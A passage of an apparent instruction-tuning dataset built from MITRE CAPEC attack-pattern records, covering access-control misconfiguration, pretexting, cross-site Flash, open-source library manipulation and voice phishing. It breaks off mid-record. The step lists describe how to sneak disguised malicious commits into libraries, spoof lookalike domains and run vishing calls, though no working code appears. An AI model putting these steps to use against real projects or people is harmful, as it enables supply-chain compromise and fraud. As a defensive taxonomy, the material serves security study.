              "Modification_Comment": "Updated @Name, @Status, Description, Example_Instances, Prerequisites, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses, Resources_Required"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-12-07",
              "#text": "API Abuse/Misuse"
            },
            {
              "@Date": "2020-12-17",
              "#text": "API Manipulation"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Exploiting Incorrectly Configured Access Control Security Levels (CAPEC ID: 180)",
    "context": "",
    "output": "Possible examples: For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.",
      "@Name": "Exploiting Incorrectly Configured Access Control Security Levels (CAPEC ID: 180)",
      "attack_ptrn": {
        "@ID": "180",
        "@Name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack.",
        "Extended_Description": {
          "xhtml:p": "Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, \"Accessing Functionality Not Properly Constrained by ACLs\" in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "122"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "17"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey] The attacker surveys the target application, possibly as a valid and authenticated user.",
              "Technique": [
                "Spider the web site for all available links.",
                "Brute force to guess all function names/action with different privileges."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Identify weak points in access control configurations] The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.",
              "Technique": [
                "The attacker attempts authenticated access to targeted functions and data.",
                "The attacker attempts unauthenticated access to targeted functions and data.",
                "The attacker attempts indirect and side channel access to targeted functions and data."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Access the function or data bypassing the access control] The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.",
              "Technique": "The attacker executes the function or accesses the data not authorized to them."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity.."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "In order to discover unrestricted resources, the attacker does not need special tools or skills. They only have to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Authorization",
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Design: Configure the access control correctly."
        },
        "Example_Instances": {
          "Example": "For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "732"
            },
            {
              "@CWE_ID": "1190"
            },
            {
              "@CWE_ID": "1191"
            },
            {
              "@CWE_ID": "1193"
            },
            {
              "@CWE_ID": "1220"
            },
            {
              "@CWE_ID": "1268"
            },
            {
              "@CWE_ID": "1280"
            },
            {
              "@CWE_ID": "1297"
            },
            {
              "@CWE_ID": "1311"
            },
            {
              "@CWE_ID": "1315"
            },
            {
              "@CWE_ID": "1318"
            },
            {
              "@CWE_ID": "1320"
            },
            {
              "@CWE_ID": "1321"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1574.010",
            "Entry_Name": "Hijack Execution Flow: Services File Permissions Weaknesses"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-29"
            },
            {
              "@External_Reference_ID": "REF-30",
              "@Section": "OWASP Top 10 2007 A3 \u2013 Malicious File Execution"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Weaknesses, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Pretexting (CAPEC ID: 407)",
    "context": "",
    "output": "Possible examples: The adversary dresses up like a jogger and runs in place by the entrance of a building, pretending to look for their access card. Because the hood obscures their face, it may be possible to solicit someone inside the building to let them inside.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The adversary dresses up like a jogger and runs in place by the entrance of a building, pretending to look for their access card. Because the hood obscures their face, it may be possible to solicit someone inside the building to let them inside.",
      "@Name": "Pretexting (CAPEC ID: 407)",
      "attack_ptrn": {
        "@ID": "407",
        "@Name": "Pretexting",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the adversary's interests. During a pretexting attack, the adversary creates an invented scenario, assuming an identity or role to persuade a targeted victim to release information or perform some action. It is more than just creating a lie; in some cases it can be creating a whole new identity and then using that identity to manipulate the receipt of information.",
        "Extended_Description": {
          "xhtml:p": "Pretexting can also be used to impersonate people in certain jobs and roles that they never themselves have done. In simple form, these attacks can be leveraged to learn information about a target. More complicated iterations may seek to solicit a target to perform some action that assists the adversary in exploiting organizational weaknesses or obtaining access to secure facilities or systems. Pretexting is not a one-size fits all solution. Good information gathering techniques can make or break a good pretext. A solid pretext is an essential part of building trust. If an adversary\u2019s alias, story, or identity has holes or lacks credibility or even the perception of credibility the target will most likely catch on."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "416"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "410"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "163"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the pretext that would influence the actions of the specific target."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary requires strong inter-personal and communication skills."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other",
            "Note": "Depending on the adversary's intentions and the specific nature their actions/requests, a successful pretexting attack can result in the compromise to the confidentiality of sensitive information in a variety of contexts."
          }
        },
        "Mitigations": {
          "Mitigation": "An organization should provide regular, robust cybersecurity training to its employees to prevent successful social engineering attacks."
        },
        "Example_Instances": {
          "Example": "The adversary dresses up like a jogger and runs in place by the entrance of a building, pretending to look for their access card. Because the hood obscures their face, it may be possible to solicit someone inside the building to let them inside."
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1589",
            "Entry_Name": "Gather Victim Identity Information"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-348"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-08-04",
            "#text": "Social Information Gathering via Pretexting"
          }
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Cross-Site Flashing (CAPEC ID: 178)",
    "context": "",
    "output": "The attacker tries to get their malicious flash movie to be executed in the targeted flash application. The malicious file is hosted on the attacker.com domain and the targeted flash application is hosted on example.com The crossdomain.xml file in the root of example.com allows all domains and no specific restriction is specified in the targeted flash application. When the attacker injects their malicious file in the vulnerable flash movie, the rogue flash application is able to access internal variables and parameter of the flash movie.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The attacker tries to get their malicious flash movie to be executed in the targeted flash application. The malicious file is hosted on the attacker.com domain and the targeted flash application is hosted on example.com The crossdomain.xml file in the root of example.com allows all domains and no specific restriction is specified in the targeted flash application. When the attacker injects their malicious file in the vulnerable flash movie, the rogue flash application is able to access internal variables and parameter of the flash movie.",
      "@Name": "Cross-Site Flashing (CAPEC ID: 178)",
      "attack_ptrn": {
        "@ID": "178",
        "@Name": "Cross-Site Flashing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker is able to trick the victim into executing a Flash document that passes commands or calls to a Flash player browser plugin, allowing the attacker to exploit native Flash functionality in the client browser. This attack pattern occurs where an attacker can provide a crafted link to a Flash document (SWF file) which, when followed, will cause additional malicious instructions to be executed. The attacker does not need to serve or control the Flash document. The attack takes advantage of the fact that Flash files can reference external URLs. If variables that serve as URLs that the Flash application references can be controlled through parameters, then by creating a link that includes values for those parameters, an attacker can cause arbitrary content to be referenced and possibly executed by the targeted Flash application.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "182"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identification] Using a browser or an automated tool, an attacker records all instances of URLs (or partial URL such as domain) passed to a flash file (SWF).",
              "Technique": [
                "Use an automated tool to record the variables passed to a flash file.",
                "Use a browser to manually explore the website and analyze how the flash file receive variables, e.g. JavaScript using SetVariable/GetVariable, HTML FlashVars param tag, etc.",
                "Use decompilers to retrieve the flash source code and record all user-controllable variables passed to a loadMovie* directive."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt to inject a remote flash file] The attacker makes use of a remotely available flash file (SWF) that generates a uniquely identifiable output when executed inside the targeted flash file.",
              "Technique": "Modify the variable of the SWF file that contains the remote movie URL to the attacker controlled flash file."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Access or Modify Flash Application Variables] As the attacker succeeds in exploiting the vulnerability, they target the content of the flash application to steal variable content, password, etc.",
              "Technique": [
                "Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and loaded by the victim browser's flash plugin and sends document information to the attacker.",
                "Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the flash application to execute appropriately."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Execute JavaScript in victim's browser] When the attacker targets the current flash application, they can choose to inject JavaScript in the client's DOM and therefore execute cross-site scripting attack.",
              "Technique": "Develop malicious JavaScript that is injected from the rogue flash movie to the targeted flash application through vectors identified during the Experiment Phase and loaded by the victim's browser."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted Flash application must reference external URLs and the locations thus referenced must be controllable through parameters. The Flash application must fail to sanitize such parameters against malicious manipulation. The victim must follow a crafted link created by the attacker."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "knowledge of Flash internals, parameters and remote referencing."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: Only allow known URL to be included as remote flash movies in a flash application",
            "Configuration: Properly configure the crossdomain.xml file to only include the known domains that should host remote flash movies."
          ]
        },
        "Example_Instances": {
          "Example": "The attacker tries to get their malicious flash movie to be executed in the targeted flash application. The malicious file is hosted on the attacker.com domain and the targeted flash application is hosted on example.com The crossdomain.xml file in the root of example.com allows all domains and no specific restriction is specified in the targeted flash application. When the attacker injects their malicious file in the vulnerable flash movie, the rogue flash application is able to access internal variables and parameter of the flash movie."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "601"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-41"
            },
            {
              "@External_Reference_ID": "REF-42",
              "@Section": "Testing for Cross site flashing"
            },
            {
              "@External_Reference_ID": "REF-561"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Open-Source Library Manipulation (CAPEC ID: 538)",
    "context": "",
    "output": "Possible examples: An adversary with access to an open source code project introduces a hard-to-find bug in the software that allows under very specific conditions for encryption to be disabled on data streams. The adversary commits the change to the code which is picked up by a manufacturer who develops VPN software. It is eventually deployed at the victim's location where the very specific conditions are met giving the adversary the ability to sniff plaintext traffic thought to be encrypted. This can provide to the adversary access to sensitive data of the victim.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary with access to an open source code project introduces a hard-to-find bug in the software that allows under very specific conditions for encryption to be disabled on data streams. The adversary commits the change to the code which is picked up by a manufacturer who develops VPN software. It is eventually deployed at the victim's location where the very specific conditions are met giving the adversary the ability to sniff plaintext traffic thought to be encrypted. This can provide to the adversary access to sensitive data of the victim.",
      "@Name": "Open-Source Library Manipulation (CAPEC ID: 538)",
      "attack_ptrn": {
        "@ID": "538",
        "@Name": "Open-Source Library Manipulation",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "Adversaries implant malicious code in open source software (OSS) libraries to have it widely distributed, as OSS is commonly downloaded by developers and other users to incorporate into software development projects. The adversary can have a particular system in mind to target, or the implantation can be the first stage of follow-on attacks on many systems.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": [
              {
                "@Exclude_ID": "437"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": {
                "xhtml:ul": {
                  "xhtml:li": [
                    "The open-source code currently in use on a selected target system.",
                    "The depth in the dependency graph of the open source code in relationship to other code bases in use on the target system. Choosing an OSS lower in the graph decreases the probability of discovery, but also decreases the scope of its use within the target system.",
                    "The programming language in which the open source code is implemented. Different languages present different opportunities for using known software weaknesses.",
                    "The quality of processes in place to make a contribution. For instance, some contribution sites use static and dynamic analysis tools, which could increase the probability of discovery.",
                    "The security requirements necessary to make a contribution. For instance, is the ownership lax allowing unsigned commits or anonymous users."
                  ]
                },
                "#text": "[Determine the relevant open-source code project to target] The adversary will make the selection based on various criteria:"
              }
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": {
                "xhtml:ul": {
                  "xhtml:li": [
                    "The adversary will probably avoid easy-to-find software weaknesses, especially ones that static and dynamic analysis tools are likely to discover.",
                    "Common coding errors or missing edge cases of the algorithm, which can be explained away as being accidental, if discovered, will be preferred by the adversary.",
                    "Sometimes no identity is required to make a contribution. Other options are to steal an existing identity or create one. When creating a new identity, strike a balance between too little or too much detail. Using an stolen identity could cause a notification to be sent to the actual user."
                  ]
                },
                "#text": "[Develop a plan for malicious contribution] The adversary develops a plan to contribute malicious code, taking the following into consideration:"
              }
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Execute the plan for malicious contribution] Write the code to be contributed based on the plan and then submit the contribution. Multiple commits, possibly using multiple identities, will help obscure the attack. Monitor the contribution site to try to determine if the code has been uploaded to the target system."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Access to the open source code base being used by the manufacturer in a system being developed or currently deployed at a victim location."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Advanced knowledge about the inclusion and specific usage of an open source code project within system being targeted for infiltration."
          }
        },
        "Example_Instances": {
          "Example": "An adversary with access to an open source code project introduces a hard-to-find bug in the software that allows under very specific conditions for encryption to be disabled on data streams. The adversary commits the change to the code which is picked up by a manufacturer who develops VPN software. It is eventually deployed at the victim's location where the very specific conditions are met giving the adversary the ability to sniff plaintext traffic thought to be encrypted. This can provide to the adversary access to sensitive data of the victim."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "494"
            },
            {
              "@CWE_ID": "829"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.001",
            "Entry_Name": "Supply Chain Compromise: Software Dependencies and Development Tools"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-439"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Description, Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated @Name, Description, Example_Instances, Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Execution_Flow, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2021-06-24",
            "#text": "Open Source Libraries Altered"
          }
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Voice Phishing (CAPEC ID: 656)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Voice Phishing (CAPEC ID: 656) are: The target receives an email or text message stating that their Apple ID has been disabled due to suspicious activity and that the included link includes instructions on how to unlock their Apple account. The link in the text message looks legitimate and once the link is clicked, the user is redirected to a legitimate-looking webpage that prompts the user to call a specified number to initiate the unlock process. The target initiates the phone call and provides their credentials or other sensitive information to the individual they assume works for Apple. Now that the adversary possess this data, it can be used to log into the account to obtain other sensitive data, such as Apple Pay information.\nAn adversary calls the target and claims to work for their bank. The adversary informs the target that their bank account has been frozen, due to potential fraudulent spending, and requires authentication in order to re-enable the account. The target, believing the caller is a legitimate bank employee, provides their bank account login credentials to confirm they are the authorized owner of the account. The adversary then confirms this authentication and claims that the account has been unlocked. Once the adversary has obtained these credentials, money can be transferred from the victim's account to an account controlled by the adversary.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The target receives an email or text message stating that their Apple ID has been disabled due to suspicious activity and that the included link includes instructions on how to unlock their Apple account. The link in the text message looks legitimate and once the link is clicked, the user is redirected to a legitimate-looking webpage that prompts the user to call a specified number to initiate the unlock process. The target initiates the phone call and provides their credentials or other sensitive information to the individual they assume works for Apple. Now that the adversary possess this data, it can be used to log into the account to obtain other sensitive data, such as Apple Pay information.",
        "An adversary calls the target and claims to work for their bank. The adversary informs the target that their bank account has been frozen, due to potential fraudulent spending, and requires authentication in order to re-enable the account. The target, believing the caller is a legitimate bank employee, provides their bank account login credentials to confirm they are the authorized owner of the account. The adversary then confirms this authentication and claims that the account has been unlocked. Once the adversary has obtained these credentials, money can be transferred from the victim's account to an account controlled by the adversary."
      ],
      "@Name": "Voice Phishing (CAPEC ID: 656)",
      "attack_ptrn": {
        "@ID": "656",
        "@Name": "Voice Phishing",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary targets users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Voice Phishing is a variation of the Phishing social engineering technique where the attack is initiated via a voice call, rather than email. The user is enticed to provide sensitive information by the adversary, who masquerades as a legitimate employee of the alleged organization. Voice Phishing attacks deviate from standard Phishing attacks, in that a user doesn't typically interact with a compromised website to provide sensitive information and instead provides this information verbally. Voice Phishing attacks can also be initiated by either the adversary in the form of a \"cold call\" or by the victim if calling an illegitimate telephone number.",
        "Alternate_Terms": {
          "Alternate_Term": [
            {
              "Term": "Vishing"
            },
            {
              "Term": "VoIP Phishing"
            }
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "98"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate organization more convincingly. The adversary can use homograph or similar attacks to convince users that they are using the legitimate website. If the adversary leverages cold-calling for this attack, this step is skipped.",
              "Technique": [
                "Optionally obtain a domain name that visually looks similar to the legitimate organization's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)",
                "Optionally obtain a legitimate SSL certificate for the new domain name."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Explore legitimate website and create duplicate] An adversary optionally creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the organization's website that they are trying to impersonate. That website will contain a telephone number for the victim to call to assist them with their issue and initiate the attack. If the adversary leverages cold-calling for this attack, this step is skipped.",
              "Technique": [
                "Use spidering software to get copy of web pages on legitimate site.",
                "Manually save copies of required web pages from legitimate site.",
                "Create new web pages that have the legitimate site's look and feel, but contain completely new content."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Convince user to provide sensitive information to the adversary.] An adversary \"cold calls\" the victim or receives a call from the victim via the malicious site and provides a call-to-action, in order to persuade the user into providing sensitive details to the adversary (e.g. login credentials, bank account information, etc.). The key is to get the victim to believe that the individual they are talking to is from a legitimate entity with which the victim does business and that the call is occurring for legitimate reasons. A call-to-action will usually need to sound legitimate and urgent enough to prompt action from the user.",
              "Technique": "Call the user a from a spoofed legitimate-looking telephone number."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use stolen information] Once the adversary obtains the sensitive information, this information can be leveraged to log into the victim's bank account and transfer money to an account of their choice, or to make fraudulent purchases with stolen credit card information.",
              "Technique": "Login to the legitimate site using another the victim's supplied credentials"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An adversary needs phone numbers to initiate contact with the victim, in addition to a legitimate-looking telephone number to call the victim from.",
            "An adversary needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their \"hooks\" to many potential victims.",
            "An adversary needs to have a sufficiently compelling call to action to prompt the user to take action.",
            "If passively conducting this attack via a spoofed website, replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Basic knowledge about websites: obtaining them, designing and implementing them, etc."
          }
        },
        "Resources_Required": {
          "Resource": "Legitimate-looking telephone number(s) to initiate calls with victims"
        },
        "Indicators": {
          "Indicator": [
            "You receive a call from an entity that you are not even a customer of prompting you to log into your account.",
